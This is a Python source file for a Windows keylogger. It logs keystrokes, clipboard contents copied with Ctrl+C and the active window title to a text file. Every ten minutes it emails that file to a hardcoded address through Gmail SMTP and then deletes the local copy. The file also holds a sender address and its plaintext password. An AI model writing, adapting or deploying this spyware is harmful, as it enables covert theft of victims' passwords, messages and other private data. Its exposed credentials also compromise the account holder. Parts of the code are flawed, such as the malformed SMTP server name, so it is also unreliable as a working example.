import threading
import keyboard
import os
import pyperclip
import time
import smtplib, ssl
import ctypes
import pickle

from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText

def copy_hotkey():
    time.sleep(0.1)
    with open("key_presses.txt", "a") as f:
        f.write("\n" + "Copied: " + pyperclip.paste() + "\n")

def get_active_window_name():
    active_window_name = None
    try:
        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
        GetWindowText = ctypes.windll.user32.GetWindowTextW

        hwnd = GetForegroundWindow()
        length = GetWindowTextLength(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        active_window_name = buff.value
    except:
        pass
    return active_window_name

class Session:

    def __init__(self):
        self.active_window = None

    def focus(self, active_window):
        self.active_window = active_window

    def save(self):
        with open("session.pickle", "wb") as f:
            pickle.dump(self, f)

    @staticmethod
    def load():
        try:
            with open("session.pickle", "rb") as f:
                return pickle.load(f)
        except FileNotFoundError:
            return Session()

def on_press(key):
    if not os.path.isfile("key_presses.txt"):
        open("key_presses.txt", "x").close()

    session = Session.load()
    if get_active_window_name() != session.active_window:
        with open("key_presses.txt", "a") as f:
            f.write("\n\nActive Window: " + get_active_window_name() + "\n")

    if not session.active_window or session.active_window != get_active_window_name():
        active_window = get_active_window_name()
        session.focus(active_window)
        session.save()

    with open("key_presses.txt", "a") as f:
        if key.name not in ["ctrl", "shift", "caps lock", "backspace", "right shift", "tab", "right ctrl", "alt gr", "esc"]:
            if key.name == "space":
                f.write(" ")
            elif key.name == "enter":
                f.write("\n")
            elif key.event_type == "down" and key.name == "c" and keyboard.is_pressed("ctrl"):
                copy_hotkey()
            else:
                f.write(key.name)


def send_email(file_name):
    port = 465  # For SSL
    smtp_server = "smtp@gmail.com"
    sender_email = "fb.omerdgn@gmail.com"  # Enter your address
    receiver_email = "omerfarukdoganweb@gmail.com"  # Enter receiver address
    password = "Omer1010"
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        with open(file_name, 'rb') as f:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver_email
            msg['Subject'] = 'Hi there'
            msg.attach(MIMEText("This is the key presses file you requested."))
            part = MIMEApplication(f.read(),Name=file_name)
            part['Content-Disposition'] = 'attachment; filename="%s"' % file_name
            msg.attach(part)
            server.send_message(msg)

def email_thread():
    while True:
        time.sleep(600)  # wait for 10 minutes
        if os.path.isfile("key_presses.txt"):
            os.rename("key_presses.txt", "key_presses2.txt")
            send_email("key_presses2.txt")
            os.remove("key_presses2.txt")

keyboard_thread = threading.Thread(target=keyboard.on_press, args=(on_press,))
keyboard_thread.start()

email_thread = threading.Thread(target=email_thread)
email_thread.start()